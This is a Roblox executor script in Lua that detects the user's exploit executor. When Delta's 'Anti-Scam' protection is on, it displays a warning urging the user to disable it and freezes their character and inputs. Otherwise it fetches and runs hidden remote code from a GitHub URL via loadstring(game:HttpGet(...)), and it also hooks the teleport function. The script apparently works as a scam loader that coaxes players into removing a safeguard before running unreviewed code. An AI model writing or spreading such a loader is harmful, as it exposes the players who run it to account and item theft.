local Players = game:GetService("Players")
local player = Players.LocalPlayer
local ContextActionService = game:GetService("ContextActionService")
local TeleportService = game:GetService("TeleportService")

-- Executor detection function
local function detectExecutor()
    if syn then
        return "Synapse"
    elseif KRNL then
        return "KRNL"
    elseif Fluxus then
        return "Fluxus"
    elseif Protosmasher then
        return "Protosmasher"
    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
        return "Arceus X"
    elseif Delta then
        return "Delta"
    else
        return "Codex / Unknown"
    end
end

local executor = detectExecutor()

-- Simulated Anti-Scam status (change for testing)
local antiScamEnabled = true

-- Debug prints
print("Executor detected:", executor)
print("Anti-Scam enabled:", antiScamEnabled)

-- Freeze player movement function
local function freezePlayer()
    print("Freezing player movement")
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.AutoRotate = false
    end
    ContextActionService:BindAction("FreezeInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
    ContextActionService:BindAction("FreezeKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
end

-- Unfreeze player movement function
local function unfreezePlayer()
    print("Unfreezing player movement")
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            humanoid.AutoRotate = true
        end
    end
    ContextActionService:UnbindAction("FreezeInputs")
    ContextActionService:UnbindAction("FreezeKeys")
end

-- Warning GUI when Anti-Scam ON
local function showWarning()
    print("Showing Delta Anti-Scam warning GUI")
    local gui = Instance.new("ScreenGui")
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.5, 0, 0.3, 0)
    frame.Position = UDim2.new(0.25, 0, 0.35, 0)
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Parent = gui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 1, -20)
    textLabel.Position = UDim2.new(0, 10, 0, 10)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.new(1, 0.8, 0)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextSize = 20
    textLabel.TextWrapped = true
    textLabel.Text = "Warning: Delta Anti-Scam is enabled.\nPlease disable it in your executor settings for full functionality."
    textLabel.Parent = frame

    freezePlayer()

    -- Unfreeze and remove warning after 30 seconds
    task.delay(30, function()
        unfreezePlayer()
        gui:Destroy()
    end)
end

-- Loader function
local function runLoader()
    print("Running loader")
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/KONI/refs/heads/main/LUA"))()
    end)
end

-- Override TeleportService.Teleport to block teleport when Anti-Scam OFF
local originalTeleport = TeleportService.Teleport
TeleportService.Teleport = function(self, placeId, ...)
    if executor == "Delta" and antiScamEnabled then
        print("Teleport allowed by Anti-Scam ON")
        return originalTeleport(self, placeId, ...)
    else
        print("Teleport blocked (Anti-Scam OFF or non-Delta executor)")
        return false
    end
end

-- Main logic
if executor == "Delta" and antiScamEnabled then
    showWarning()
else
    runLoader()
end
